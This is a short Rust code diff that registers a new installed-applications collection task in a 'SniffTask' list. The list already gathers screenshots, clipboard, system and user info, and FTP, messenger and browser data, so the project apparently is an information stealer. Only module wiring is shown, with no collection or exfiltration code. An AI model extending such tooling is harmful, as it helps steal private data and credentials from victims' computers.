@@ -7,8 +7,10 @@ mod processes;
 mod screenshot;
 mod systeminfo;
 mod userinfo;
+mod installedapps;
 
 use crate::clipboard::ClipboardTask;
+use crate::installedapps::InstalledAppsTask;
 use crate::processes::ProcessesTask;
 use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
@@ -33,6 +35,7 @@ impl<C: Collector + 'static> Default for SniffTask<C> {
                 SystemInfoTask,
                 ClipboardTask,
                 UserInfoTask,
+                InstalledAppsTask,
                 FtpTask::default(),
                 MessengersTask::default(),
                 BrowsersTask::default(),
